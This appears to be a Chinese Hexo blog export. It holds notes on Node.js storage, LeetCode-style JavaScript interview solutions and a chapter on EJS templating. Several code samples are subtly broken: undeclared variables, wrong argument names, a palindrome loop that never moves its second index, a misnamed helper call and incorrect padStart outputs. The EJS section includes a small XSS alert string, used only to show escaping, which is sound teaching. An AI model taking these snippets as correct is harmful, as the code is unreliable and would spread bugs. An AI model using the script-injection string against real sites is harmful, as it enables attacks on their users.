。IndexedDB是唯一支持二进制数据存储的后台，也就是说后台用的是 WebSQL 和 localStorage ，会有编组开销： 12345Promise.all([ localforage.setItem('number', 3), localforage.setItem('object', &#123; key: 'value' &#125;), localforage.setItem('typedArray', new Uint32Array([1, 2, 3]))]) 将 API 做成跟 Web 存储一样让 localForage 用起来也简单，也解决了很多缺点和兼容性问题。 存储托管使用存储托管不需要管理自己的服务器端存储，可以迅速尝试所有工具，甚至无需自己搭建自己的数据库主机就能部署对外开放的生成程序。但部署自己的数据存储越来越简单，很多云服务提供商都有预先配置好的服务器映像，安装了运行所选数据库所需的全部软件，并且全都配置好了。 简单存储服务Amazon 的简单存储服务（S3）是一种远程文件托管服务，包含在大受欢迎的 ASW 包中，用 S3存储和托管开放的文件有成本上的优势。它是云端的文件系统。可以用 RESTful HTTP 调用将文件和不超过 2KB的元数据上传到桶中。然后通过 HTTP GET 或 BitTorrent 协议访问这些内容。 我们可以对桶中及其中的内容进行各种访问许可配置，包括基于时间的访问。还可以给桶里的内容指定一个生存期（TTL），生存期过后会从桶中删除，再也访问不到。将 S3 数据提升到内容交付网络（CDN）中也很容易。AWS 提供了 CloudFront CDN,可以轻松链接到你的文件，然后用很低的延时提供给全世界。 S3 可以存储任何文件，只要不超过 5TB，任何格式都可以。在处理要作为一个整体来访问的、不怎么变化的大块数据时，S3 的表现最好。 总结 Node 既能用关系型数据库，也能用 NoSQL 数据库 简单的 pg 模块很擅长处理 SQL 语言 Knex 模块可以使用几个数据库 ACID 是一组数据库事务属性，也可以保证安全性 MongoDB 是使用 JavaScript 的 NoSQL 数据库 Redis 是可以当做数据库和缓存用的数据结构化存储 LevelDB 是源自 Google 高速键/值对存储，可以将字符串映射到值 LevelDB 是模块化数据库 基于 Web 的存储，包括 LocalForage 和 localStorge ，可以将数据保存在浏览器中， 可以用 Amazon S3 这样的存储服务把数据保存到云提供商那里]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试题目汇总摘录（JS 编程篇）]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-JS%20%E7%BC%96%E7%A8%8B%E7%AF%87.html</url>
    <content type="text"><![CDATA[温故而知新，保持空杯心态.leetCode 题目整理。 JS 编程题难度：简单两数之和给定一个整数数组 nums 和 一个目标值 target，找出和为目标值的那两个整数，并返回他们的数组下标。可以假设每种输入只会对应一个答案，但是，不能重复利用这个数组中相同的元素。 1234567891011121314151617181920212223242526// 最笨的解法/*** @param &#123;number[]&#125; nums* @param &#123;number&#125; target* @param &#123;number[]&#125;*/var twoNum = function(nums,target)&#123; for(let i=0;i&lt;nums.length;i++)&#123; for(let j=0;j&lt;nums.length;j++)&#123; if(i !== j &amp;&amp; nums[i] + nums[j] === target)&#123; return [i,j] &#125; &#125; &#125;&#125;// 其他解法mapvar twoNum = function(nums,target)&#123; for(let i=0;i&lt;nums.length;i++)&#123; if(map.has(target-nums[i]))&#123; return [map.get(target-nums[i]),i] &#125; map.set(nums[i],i) &#125;&#125;twoSum([3,2,4],6)// [1,2] 两数之和-输出有序数组给定一个已按照升序排列的有序数组，找出两个数使得它们相加之和等于目标数。 函数应该返回这两下标志 index1 和 index2，其中 index1必须小于 index2 1234567891011121314151617181920212223242526272829/** * @param &#123;number[]&#125; numbers * @param &#123;number&#125; target * @return &#123;number[]&#125; */var twoNum = function(numbers,target)&#123; let map = new Map(); for(let i=0;i&lt;numbers.length;i++)&#123; if(map.has(target-numbers[i]))&#123; return [map.get(target-numbers[i]),i+1] &#125; map.set(numbers[i],i+1) &#125;&#125;// 双指针var twoNum = function(numbers,target)&#123; var left = 0, right=numbers.length-1; while(left &lt; right)&#123; if(numbers[left]+numbers[right] === target)&#123; return [left+1,right+1] &#125;else if(numbers[left]+numbers[right]&lt;target)&#123; left++; &#125;else&#123; right--; &#125; &#125;&#125; 两数之和-输入 BST给定一个二叉树和一个目标结果，如果 BST 中存在两个元素且它们的和一个目标结果，如果 BST 中存在两个元素且它们的和等于给定的目标结果，则返回 true 12345678910111213141516171819202122232425262728/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; root * @param &#123;number&#125; k * @return &#123;boolean&#125; */var findTarget = function(root,k)&#123; let array = []; dfs(node,array); let map = new Map(); for(let i=0;i&lt;array.length;i++)&#123; if(map.has(k-array[i])) return true map.set(array[i],i) &#125; return false&#125;function dfs(node,array)&#123; if(!node) return; dfs(node.right,array); array.push(node.val); dfs(node.left,array)&#125; 整数反转给出一个32位有符号整数，需要将这个整数中每位的数字进行反转 注意: 假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−231, 231 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。 1234567891011121314151617181920212223// 输入：123// 输出：321// 输入：-123// 输出：-321// 输入：120// 输出：21/*** @param &#123;number&#125; x* @return &#123;number&#125;*/var reverse = function(x)&#123; const MAX_VALUE = Math.pow(2,31) - 1; const MIN_VALUE = Math.pow(-2,31); let sum = 0; while(x)&#123; sum = sum * 10 + x % 10; x = x / 10 &gt;&gt; 0 &#125; if(sum &lt; MAX_VALUE &amp;&amp; sum &gt; MIN_VALUE)&#123; return sum &#125; return 0;&#125; &gt;&gt;0 与 &gt;&gt;&gt;0：前者是有符号右移，后者是无符号 移位操作符在移位前做了两种转换，第一将不是 number 类型的数据转换成 number，第二将 number 转换成无符号的 32bit数据，也就是 Uint32类型。这些与移位的位数无关，移位 0 位 主要就是用了 js 的内部特性做了前两种的转换。 Unit32类型是如何转换的： 如果不能转换为 Number，那就是为 0 如果为非整数，先转换成为整数 如果是正数，就返回正数，如果是负数，就返回负数 +2 的 32次方 12345678910function ToInteger(x)&#123; x = Number(x); return x &lt; 0 ? Math.ceil(x) : Math.floor(x)&#125;function modulo(a,b)&#123; return a - Math.floor(a/b) * b&#125;function ToUnit32(x)&#123; return module(ToInteger(x),Math.pow(2,32))&#125; 颠倒二进制颠倒给定的 32 位无符号整数的二进制位 1234567891011121314151617/**输入: 00000010100101000001111010011100输出: 00111001011110000010100101000000解释: 输入的二进制串 00000010100101000001111010011100 表示无符号整数 43261596， 因此返回 964176192，其二进制表示形式为 00111001011110000010100101000000。 *//**输入：11111111111111111111111111111101输出：10111111111111111111111111111111解释：输入的二进制串 11111111111111111111111111111101 表示无符号整数 4294967293， 因此返回 3221225471 其二进制表示形式为 10101111110010110010011101101001。 *//*** @param &#123;numebr&#125; n - a positive integer* @param &#123;return&#125; n - a positive integer*/var reverseBits = function(n)&#123; return Number.parseInt([...n.toString(2)].reverse().join('').padEnd(32,'0'),2)&#125; padEnd、padStart ES2017引入了字符串不全长度的功能，如果某个字符串不够指定长度，会在头部或者尾部补全。 1234567891011121314'x'.padStart(4,'ab'); // abax'x'.padStart(5,'ab'); // ababx'x'.padEnd(4,'ab'); // xaba'x'.padEnd(5,'ab'); // xabab// 如果原字符串的长度，等于或者大于指定的最小长度，则返回原字符串//常见用途// 为数值补全指定位数'1'.padStart(10,'0'); // 000000001'12'.padStart(10,'0'); // 000000012// 提示字符串格式'12'.padEnd(10,'YYYY-MM-DD') // 'YYYY-MM-DD''09-12'.padStart(10,'YYYY-MM-DD'); // 'YYYY-09-12' 回文数判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数 123456789101112131415161718192021222324252627282930313233/*** @param &#123;number&#125; x* return &#123;boolean&#125;*/// 最笨的方法var isPalindrome = function(x)&#123; let str = x.toString(); let len = str.length; let j = len - 1; for(let i=0;i&lt;len;i++)&#123; if(str[i] !== str[j])&#123; return false &#125; &#125; return true;&#125;// 书写简单但是速度慢var isPalindrome = function(x)&#123; return x == x.toString().split('').reverse().join('') &#125;// 不转换为字符串，用原来的数字解var isPalindrome = function(x) &#123; let original = x ; let result = 0; while(x)&#123; result = result * 10 + x % 10; x = x /10 &gt;&gt; 0 &#125; return original === result&#125;; 唯一的摩尔斯密码际摩尔斯密码定义一种标准编码方式，将每个字母对应于一个由一系列点和短线组成的字符串， 比如: “a” 对应 “.-“, “b” 对应 “-…”, “c” 对应 “-.-.”, 等等。 为了方便，所有26个英文字母对应摩尔斯密码表如下： 1[&quot;.-&quot;,&quot;-...&quot;,&quot;-.-.&quot;,&quot;-..&quot;,&quot;.&quot;,&quot;..-.&quot;,&quot;--.&quot;,&quot;....&quot;,&quot;..&quot;,&quot;.---&quot;,&quot;-.-&quot;,&quot;.-..&quot;,&quot;--&quot;,&quot;-.&quot;,&quot;---&quot;,&quot;.--.&quot;,&quot;--.-&quot;,&quot;.-.&quot;,&quot;...&quot;,&quot;-&quot;,&quot;..-&quot;,&quot;...-&quot;,&quot;.--&quot;,&quot;-..-&quot;,&quot;-.--&quot;,&quot;--..&quot;] 给定一个单词列表，每个单词可以写成每个字母对应摩尔斯密码的组合。例如，”cab” 可以写成 “-.-..–…”，(即 “-.-.” + “-…” + “.-“字符串的结合)。我们将这样一个连接过程称作单词翻译。 返回我们可以获得所有词不同单词翻译的数量。 例如: 1234567891011// 输入: words = ["gin", "zen", "gig", "msg"]//输出: 2// 解释: // 各单词翻译如下:"gin" -&gt; "--...-.""zen" -&gt; "--...-.""gig" -&gt; "--...--.""msg" -&gt; "--...--." 共有 2 种不同翻译, “–…-.” 和 “–…–.”. 注意: 单词列表words 的长度不会超过 100。 每个单词 words[i]的长度范围为 [1, 12]。 每个单词 words[i]只包含小写字母。 解题思路： 循环遍历获取单次列表中每个单词的 Unicode 编码，已知所有的单词都是小写字母，然后 97~122是26个小写字母的编码，减去 97 后可以对应密码表的索引。取出每个单词的密码相互比较，得出所有词不同单词的长度。 123456789101112131415161718const code = [".-","-...","-.-.","-..",".","..-.","--.","....","..",".---","-.-",".-..","--","-.","---",".--.","--.-",".-.","...","-","..-","...-",".--","-..-","-.--","--.."];/** *@params &#123;string[]&#125; words *@return &#123;number&#125; */ const words = ["gin", "zen", "gig", "msg"]; var uniqueMorseRepresentations = function(words)&#123; const len = words.length; for(let i = 0;i &lt; len;i++)&#123; let str = ''; for(let j = 0; j &lt; words[i].length; j++)&#123; str +=code[words[i][j].charCodeAt()-97]; &#125; words[i] = str &#125; return [...new Set(words)].length; &#125; uniqueMorseRepresentations(words); 宝石与石头给定字符串J 代表石头中宝石的类型，和字符串 S代表你拥有的石头。 S 中每个字符代表了一种你拥有的石头的类型，你想知道你拥有的石头中有多少是宝石。 J 中的字母不重复，J 和 S中的所有字符都是字母。字母区分大小写，因此&quot;a&quot;和&quot;A&quot;是不同类型的石头。 示例 1: 12输入: J = &quot;aA&quot;, S = &quot;aAAbbbb&quot;输出: 3 示例 2: 12输入: J = &quot;z&quot;, S = &quot;ZZ&quot;输出: 0 注意: S 和 J 最多含有50个字母。 J 中的字符不重复。 解题思路： 遍历获取石头 S中每个字母，用 match函数对 J 进行匹配，匹配成功计数加1。 match: 1234567/** searchvalue 必需。规定要检索的字符串值。 regexp 必需。规定要匹配的模式的 RegExp 对象。如果该参数不是 RegExp 对象，则需要首先把它传递给 RegExp 构造函数，将其转换为 RegExp 对象。 返回值 存放匹配结果的数组。该数组的内容依赖于 regexp 是否具有全局标志 g。*/stringObject.match(searchvalue)stringObject.match(regexp) 1234567891011121314151617/*** @param &#123;string&#125; J* @param &#123;string&#125; K* @return &#123;number&#125; */var J = "aA", S = "aAAbbbb";var numJewelsInStones = function(J,S)&#123; let count = 0; for(let i = 0; i &lt; S.length; i++)&#123; if(J.match(S.charAt(i))&#123; count++; &#125;; &#125; return count;&#125;numJewelsInStones(J,S); 按奇偶排序数组给定一个非负整数数组 A，返回一个由 A 的所有偶数元素组成的数组，后面跟 A 的所有奇数元素。 你可以返回满足此条件的任何数组作为答案。 示例： 123输入：[3,1,2,4]输出：[2,4,3,1]输出 [4,2,3,1]，[2,4,1,3] 和 [4,2,1,3] 也会被接受。 提示： 1 &lt;= A.length &lt;= 5000 0 &lt;= A[i] &lt;= 5000 解题思路： 遍历数组中的元素，双指针，当指针1从开头开始，指针2从结尾开始。指针1检测到元素对2取余的时候等于0，跳出循环；接着指针2检测到元素对2取余时等于1，跳出循环，交换两个指针上面的值。指针1继续向右（+1），指针2继续向左（-1）搜寻。 12345678910111213141516171819202122232425262728293031323334353637/** * @param &#123;number[]&#125; A * @return &#123;number[]&#125; */ const numberArray = [1,2,3,4]; var sortArrayByParity = function(A)&#123; const len = A.length; if(len === 1) return A; let i = 0; let j = len-1; while (i &lt; j) &#123; if(A[i] % 2 === 0)&#123; i++; continue; &#125; if(A[j] % 2 === 1)&#123; j--; continue; &#125; let temp = A[i]; A[i] = A[j]; A[j] = temp; i++; j-- &#125; // return A.sort(function(x)&#123; // if(x % 2 === 1) return 1; // &#125;); // const result = []; // A.map(v=&gt;&#123; // return v%2?result.push(v):result.unshift(v); // &#125;); // return result; return A; &#125;console.log(sortArrayByParity(numberArray)); 按奇偶排序数组2给定一个非负整数数组 A， A 中一半整数是奇数，一半整数是偶数。 对数组进行排序，以便当 A[i] 为奇数时，i 也是奇数；当 A[i] 为偶数时， i 也是偶数。 你可以返回任何满足上述条件的数组作为答案。 示例： 123输入：[4,2,5,7]输出：[4,5,2,7]解释：[4,7,2,5]，[2,5,4,7]，[2,7,4,5] 也会被接受。 提示： 2 &lt;= A.length &lt;= 20000 A.length % 2 == 0 0 &lt;= A[i] &lt;= 1000 解题思路： A[i] 为奇数时，i 也是奇数；当 A[i] 为偶数时， i 也是偶数。设定一个变量j为1，A[j]为奇数，i设为0，从0,2,4这样的间隔开始遍历，当 A[i]上的元素为奇数时，检测A[j]上面的数是否为奇数，如果是的话就+2检查下一项，如果不是奇数，就交换i,j位置。 1234567891011121314151617181920const array = [5,7,10,2];/** * @param &#123;number[]&#125; A * @return &#123;number[]&#125;*/var sortArrayByParity2 = function(A)&#123; let j = 1; for(let i = 0; i &lt; A.length-1; i = i+2)&#123; if(A[i] % 2 === 1)&#123; while(A[j] % 2 === 1)&#123; j = j + 2; &#125; let temp = A[i]; A[i] = A[j]; A[j] = temp; &#125; &#125; return A;&#125;sortArrayByParity2(array); 机器人能否返回原点在二维平面上，有一个机器人从原点 (0, 0) 开始。给出它的移动顺序，判断这个机器人在完成移动后是否在 (0, 0) 处结束。 移动顺序由字符串表示。字符 move[i] 表示其第 i 次移动。机器人的有效动作有 R（右），L（左），U（上）和 D（下）。如果机器人在完成所有动作后返回原点，则返回 true。否则，返回 false。 注意：机器人“面朝”的方向无关紧要。 “R” 将始终使机器人向右移动一次，“L” 将始终向左移动等。此外，假设每次移动机器人的移动幅度相同。 示例 1: 12输入: &quot;UD&quot;输出: true 解释：机器人向上移动一次，然后向下移动一次。所有动作都具有相同的幅度，因此它最终回到它开始的原点。因此，我们返回 true。示例 2: 12输入: &quot;LL&quot;输出: false 解释：机器人向左移动两次。它最终位于原点的左侧，距原点有两次 “移动” 的距离。我们返回 false，因为它在移动结束时没有返回原点。 解题思路： 设定x,y坐标，遍历字符串，根据不同的字符串来移动x,y的距离。最后判断x,y是否等于初始值来判断是否在原地。 123456789101112131415161718192021222324252627/** *@params &#123;string&#125; moves *@return &#123;boolean&#125; */ var judgeCircle = function(moves)&#123; let x=0,y=0,moveArr = moves.split(''); moveArr.map(i =&gt;&#123; switch(i) &#123; case 'R': x++ break; case 'L': x--; break; case 'U': y++ break; case 'D': y--; break; default: break; &#125; &#125;) return x === 0 &amp;&amp; y === 0; &#125; console.log(judgeCircle('UD')); 汉明距离两个整数之间的汉明距离指的是这两个数字对应二进制位不同的位置的数目。 给出两个整数 x 和 y，计算它们之间的汉明距离。 注意：0 ≤ x, y &lt; 231. 示例: 12输入: x = 1, y = 4输出: 2 解释: 1231 (0 0 0 1)4 (0 1 0 0) ↑ ↑ 上面的箭头指出了对应二进制位不同的位置。 解题思路： 异或（^）:位不相等时取1，否则取零 123451 (0 0 0 1)^4 (0 1 0 0)----------------- (0 1 0 1) 123456789/** * @param &#123;number&#125; x * @param &#123;number&#125; y * @return &#123;number&#125; */ var hammingDistance = function(x, y) &#123; return (x^y).toString(2).replace(/0/g,'').length; &#125;; hammingDistance(1,4); 翻转图像给定一个二进制矩阵 A，我们想先水平翻转图像，然后反转图像并返回结果。 水平翻转图片就是将图片的每一行都进行翻转，即逆序。例如，水平翻转 [1, 1, 0] 的结果是 [0, 1, 1]。 反转图片的意思是图片中的 0 全部被 1 替换， 1 全部被 0 替换。例如，反转 [0, 1, 1] 的结果是 [1, 0, 0]。 示例 1: 12输入: [[1,1,0],[1,0,1],[0,0,0]]输出: [[1,0,0],[0,1,0],[1,1,1]] 解释: 首先翻转每一行: [[0,1,1],[1,0,1],[0,0,0]]；​ 然后反转图片: [[1,0,0],[0,1,0],[1,1,1]]示例 2: 12输入: [[1,1,0,0],[1,0,0,1],[0,1,1,1],[1,0,1,0]]输出: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]] 解释: 首先翻转每一行: [[0,0,1,1],[1,0,0,1],[1,1,1,0],[0,1,0,1]]；​ 然后反转图片: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]]说明: 1 &lt;= A.length = A[0].length &lt;= 20 0 &lt;= A[i][j] &lt;= 1 解题思路： ~1的计算步骤： 将1(这里叫：原码)转二进制 ＝ 00000001 按位取反 ＝ 11111110 发现符号位(即最高位)为1(表示负数)，将除符号位之外的其他数字取反 ＝ 10000001 末位加1取其补码 ＝ 10000010 转换回十进制 ＝ -2 123456789/** * @param &#123;number[][]&#125; A * return &#123;number[][]&#125; */ const img = [[1,1,0],[1,0,1],[0,0,0]]; var flipAndInvertImage = function(A)&#123; return A.map(v=&gt; v.map( i =&gt; ~i + 2).reverse()) &#125; flipAndInvertImage(img); 增减字符串匹配给定只含 “I”（增大）或 “D”（减小）的字符串 S ，令 N = S.length。 返回 [0, 1, …, N] 的任意排列 A 使得对于所有 i = 0, …, N-1，都有： 如果 S[i] == “I”，那么 A[i] &lt; A[i+1]如果 S[i] == “D”，那么 A[i] &gt; A[i+1] 示例 1： 12输出：&quot;IDID&quot;输出：[0,4,1,3,2] 示例 2： 12输出：&quot;III&quot;输出：[0,1,2,3] 示例 3： 12输出：&quot;DDI&quot;输出：[3,2,0,1] 提示： 1 &lt;= S.length &lt;= 1000S 只包含字符 “I” 或 “D”。 解题思路: 对 长度为N的从0开始顺序排序的数组根据 ‘I’,’D’进行排序。 1234567891011121314151617181920/** * @param &#123;string&#125; S * @return &#123;number[]&#125; */ const str = 'IDID'; var diStringMatch = function(S)&#123; S += "I" let stArr = S.split(''); let Arr = [...new Array(S.length)].map((v,i) =&gt; i); let result = []; stArr.map(v =&gt;&#123; if(v === 'I')&#123; result.push(Arr.shift()); &#125;else&#123; result.push(Arr.pop()); &#125; &#125;) return result; &#125; diStringMatch(str); 山脉数组的峰顶索引我们把符合下列属性的数组 A 称作山脉： A.length &gt;= 3存在 0 &lt; i &lt; A.length - 1 使得A[0] &lt; A[1] &lt; … A[i-1] &lt; A[i] &gt; A[i+1] &gt; … &gt; A[A.length - 1]给定一个确定为山脉的数组，返回任何满足 A[0] &lt; A[1] &lt; … A[i-1] &lt; A[i] &gt; A[i+1] &gt; … &gt; A[A.length - 1] 的 i 的值。 示例 1： 12输入：[0,1,0]输出：1 示例 2： 12输入：[0,2,1,0]输出：1 提示： 3 &lt;= A.length &lt;= 100000 &lt;= A[i] &lt;= 10^6A 是如上定义的山脉 解题思路： 由于已知数组一定是山脉数组，所以可以理解为求数组中的最大数？ 12345678910111213141516/** * @param &#123;number[]&#125; A * @return &#123;number&#125; */ const arr = [0,1,2,3,2,1,0]; var peakIndexInMoutainArray = function(A)&#123; let max = A[0],index; for(let i =0; i &lt; A.length; i++)&#123; if(A[i]&gt;max)&#123; max = A[i] index=i; &#125; &#125; return index; &#125; peakIndexInMoutainArray(arr); 二叉树的最大深度给定一个二叉树，找出其最大深度。 二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。 说明: 叶子节点是指没有子节点的节点。 示例：给定二叉树 [3,9,20,null,null,15,7]， 3 / \ 9 20 / \ 15 7 返回它的最大深度 3 解题思路： 递归 1234567891011121314151617/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; root * @return &#123;number&#125; */ var maxDepth = function(root)&#123; if(root === null)&#123; return 0; &#125; return Math.max(arguments.callee(root.left),arguments.callee(root.right))+1; &#125; 数字的补数给定一个正整数，输出它的补数。补数是对该数的二进制表示取反。 注意: 给定的整数保证在32位带符号整数的范围内。你可以假定二进制数不包含前导零位。示例 1: 12输入: 5输出: 2 解释: 5的二进制表示为101（没有前导零位），其补数为010。所以你需要输出2。示例 2: 12输入: 1输出: 0 解释: 1的二进制表示为1（没有前导零位），其补数为0。所以你需要输出0。 解题思路： 异或（^）:位不相等时取1，否则取零 123456789/** * @param &#123;number&#125; num * @return &#123;number&#125; */const num = 5;var findComplement = function(num)&#123; return parseInt(num.toString(2).split('').map(v=&gt; 1^v ).join(''),2);&#125;findComplement(num); 数值千分位格式化几个常见的截取字符函数 substr语法： 1stringObject.substr(start,length) 参数 描述 start 必需。要抽取的子串的起始下标。必需是数值，如果是负数，那么改参数声明从字符串的尾部开始算起的位置。也就是说，-1 指字符串中最后一个字符，-2指倒数第二个字符 length 可选，子串中字符数，必须是数值。如果省略了该参数，那么返回从 stringobject 的开始位置到结尾的子串 substring语法： 1stringObject.substring(start,stop) 参数 描述 start 必需。一个非负的整数，规定要提取的子串的第一个字符在 stringObject 中的位置 stop 可选。一个非负的整数，比要提取的子串的最后一个字符在 stringObject 中的位置多1.如果忽略该参数，那么返回的子串会一直到字符串的结尾 返回 一个新的字符串，该字符串值包含 stringObject 的一个子字符串，内容是从 start 到 stop-1 的所有字符，其长度为 stop 减 start slice语法： 1stringObject.slice(start,end) 参数 描述 start 要抽取的片断的起始下标。如果是负数，则该参数规定是从字符串的尾部开始算起的位置。也就是说，-1指字符串的最后一个字符，-2指倒数第二个字符，以此类推 end 紧接着要抽取的片段的结尾的下标。若未指定该参数，则要提取的子串包括 start 到原字符串结尾的字符串。如果该参数是负数，那么它规定的是从字符串的尾部开始算起的位置 return 一个新的字符串，包括字符串从 start 开始从 end （不包括end）结束为止的所有字符 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647const n = 12345678910;// 方法1function format(n)&#123; const result = []; const str = n.toString(); const len = str.length; for(let i=1;i&lt;=len/3;i++)&#123; result.unshift(str.substr(len-i*3,3)); if(len-i*3&lt;3)&#123; result.unshift(str.substr(0,len-i*3)) &#125; &#125; return result.join(',');&#125;// 方法2function format(n)&#123; let resultStr = ''; const str = n.toString(); const len = str.length; let j=0; for(let i=len-1;i&gt;=0;i--)&#123; j++; resultStr=str.charAt(i)+resultStr if(!(j%3) &amp;&amp; i!=0)&#123; resultStr=','+resultStr &#125; &#125; return resultStr;&#125;// 方法3function format(n)&#123; const result = []; const str = n.toString(); const len = str.length; for(let i=0;i&lt;len/3;i++)&#123; result.unshift(str.substring(len-(i+1)*3,len-i*3)) &#125; return result.join(',');&#125;// 方法4function format()&#123; &#125;// 方法5function format(n)&#123; return (n.toFixed(2) + '').replace(/\d&#123;1,3&#125;(?=(\d&#123;3&#125;)+(\.\d*)?$)/g,'$&amp;,')&#125;]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>前端面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejs实战 —— Web 程序的模板]]></title>
    <url>%2F2018-12-17-NodeJs2-Part7.html</url>
    <content type="text"><![CDATA[读 《node.js实战2.0》，进行学习记录总结。 当当网购买链接 豆瓣网1.0链接 这章会涉及三个热门的模板引擎，以及如何用模板把显示层标记从逻辑代码中分离出来，保持 Web 程序代码的整洁性。 Web 程序的模板用模板保持代码的整洁性在 Node 中 可以像其他 Web 技术一样，用 MVC 模式开发传统的 Web 程序。主要的思想是将逻辑、数据和展示层分离。在遵循 MVC 模式的 Web 程序中，一般是用户向服务器请求资源，然后控制器向模型请求数据，得到数据后传到视图，再由视图以特定格式将数据呈现给用户。MVC 中的视图部分一般会用到某种模板语言。在使用模板时，视图会将模型返回的数据传递给模板引擎，并制定用那个模板文件展示这些数据。 模板文件中通常包含数据的占位符、HTML、CSS，有时还会用一些客户端 JavaScript 来做第三方小部分显示，比如点赞按钮、或者触发界面行为，隐藏显示页面等等操作。因为模板文件的工作重点是展示而不是处理逻辑，所以前后端人员可以一起工作，有利于项目任务的分工。 模板实战博客文章是从文本中读取的，格式如下。---表明一篇文章结束，另一篇文章开始。 1234567title: It is someone birthday!data: January 09,2098I am getting old, but thankfully i am not in jail!---title: Movies are pretty gooddata: January 2,2078I have been watching a lot of movies lately.It is relaxing,except when they have clowns in them. 博客程序代码，读取博客文章 1234567891011121314151617181920212223242526272829303132333435// index.jsconst fs = require('fs');const http = require('http');// 读取和解析博客文章的数据function getEntries() &#123; const entries = []; // 从文件中读取博客文章的数据 let entriesRaw = fs.readFileSync('./entries.txt', 'utf8'); entriesRaw = entriesRaw.split('---'); entriesRaw(entryRaw =&gt; &#123; const entry = &#123;&#125;; const lines = entryRaw.split('\n'); lines.map(line =&gt; &#123; if (line.indexOf('title: ') === 0) &#123; entry.title = line.replace('title: ', ''); &#125; else if (line.indexOf('date: ') === 0) &#123; entry.date = line.replace('date: ', ''); &#125; else &#123; entry.body = entry.body || ''; entry.body += line; &#125; &#125;) entries.push(entry); &#125;); return entries;&#125;const entries = getEntries();console.log(entries);const server = http.createServer((req, res) =&gt; &#123; const output = blogPage(entries); res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.end(output);&#125;);server.listen(8000); 页面用函数 blogPage 函数渲染的，用它把文章渲染到 HTML 页面中，以便发送浏览器，有两种不同的尝试方式,用模板和不用模板。 不用模板博客程序可以直接输出 HTML，但杂处理逻辑中引入 HTML 会让代码变得很乱 1234567891011121314151617181920212223function blogPage(entries) &#123; let output = ` &lt;html&gt; &lt;head&gt; &lt;style type="text/css"&gt; .entry_title &#123; font-weight: bold; &#125; .entry_date &#123; font-style: italic; &#125; .entry_body &#123; margin-bottom: 1em; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;/html&gt; ` entries.map(entry =&gt; &#123; output += ` &lt;div class="entry_title"&gt;$&#123;entry.title&#125;&lt;/div&gt; &lt;div class="entry_date"&gt;$&#123;entry.date&#125;&lt;/div&gt; &lt;div class="entry_body"&gt;$&#123;entry.body&#125;&lt;/div&gt; ` &#125;); output += `&lt;/body&gt;&lt;/html&gt;`; return output;&#125; 可以看出来，逻辑中有很多 HTML 会显得很乱。 用模块渲染 HTML 模板可以把 HTML 从处理逻辑中挪走，大幅度提高代码的整洁性。 安装 Embedded JavaScript 模块演示： 1npm install ejs 加载模板 1234567const ejs = require('ejs');const template = fs.readFileSync('./template/blog_page.ejs', 'utf8');function blogPage() &#123; const values = &#123; entries &#125;; return ejs.render(template, values);&#125; EJS 模板文件是由 HTML 标记和数据占位符构成的。 1234567891011121314151617181920212223242526&lt;html&gt;&lt;head&gt; &lt;style&gt; .entry_title &#123; font-weight: bold; &#125; .entry_date &#123; font-style: italic; &#125; .entry_body &#123; margin-bottom: 1em; &#125; &lt;/style&gt; &lt;body&gt; &lt;% entries.map(entry =&gt;&#123; %&gt; &lt;div class=&quot;entry_title&quot;&gt;&lt;%= entry.title %&gt;&lt;/div&gt; &lt;div class=&quot;entry_date&quot;&gt;&lt;%= entry.date %&gt;&lt;/div&gt; &lt;div class=&quot;entry_body&quot;&gt;&lt;%= entry.body %&gt;&lt;/div&gt; &lt;% &#125;) %&gt; &lt;/body&gt;&lt;/head&gt;&lt;/html&gt; Node 社区创建了很多模板引擎，HTML 需要闭合标签，而 CSS 需要左右大括号，会有特殊的语言，例如 Pug 语言可以更简洁地表示 HTML 或者 CSS 。 本节会介绍三种模板引擎，以及在 Node 中如何取使用它们： Embedded JavaScript （EJS）引擎 极简的 Hogan 引擎 Pug 模板引擎 Embedded JavaScript 的模板Embedded JavaScript 处理模板的方式简单直接，可以把 EJS 标签当做数据准备的占位符嵌入到 HTML 中，还可以在模板中执行纯 JavaScript 代码，就像 PHP 那样完成条件分支和循环之类的工作。 创建模板在模板的世界中，发送给模板引擎做渲染的数据有时被称为上下文，而下面是 EJS 用一个简单的模板渲染上下文的例子： 1234const ejs = require('ejs');const template = '&lt;%= message %&gt;'const context = &#123; message: 'Hello template!'&#125;console.log(ejs.render(template, context)); 注意发送给 render 第二个参数中的 locals 的用法。第二个参数可以包含 EJS 选项以及上下文数据，而 locals 可以确保上下文数据不会被当做 EJS 选项。但大多数情况下你都可以把上下文本身当做第二个参数，例如下面render: 1console.log(ejs.render(template,context)); 如果把上下文直接当做 render 的第二个参数，一定不要给上下文中的值用这些名称：cache/client/close/compileDebug/debug/filename/open/scope 。它们是为修改模板引擎设定的保留字。 字符转义在渲染时，EJS 会转义上下文值中的所有特殊字符，将它们替换为 HTML 实体码，这是为了防止跨站脚本(xss)攻击，恶意用户会将 JavaScript 作为数据提交给 Web 程序，希望其他用户访问包含这些数据 的页面时能在他们的浏览器中执行。下面的代码展示了 EJS 的转义处理。 1234const ejs = require('ejs');const template = '&lt;%= message %&gt;'const context = &#123; message: "&lt;script&gt; alert('XSS attack);&lt;script/&gt;"&#125;console.log(ejs.render(template,context)); 这段代码在显示时会输出下面这种代码： 1&amp;lt;script&amp;gt;alert('XSS attack');&amp;lt;/script&amp;gt; 如果用在模板中的是可信数据，不想做转义处理，可以用 &lt;%-代替 &lt;%= 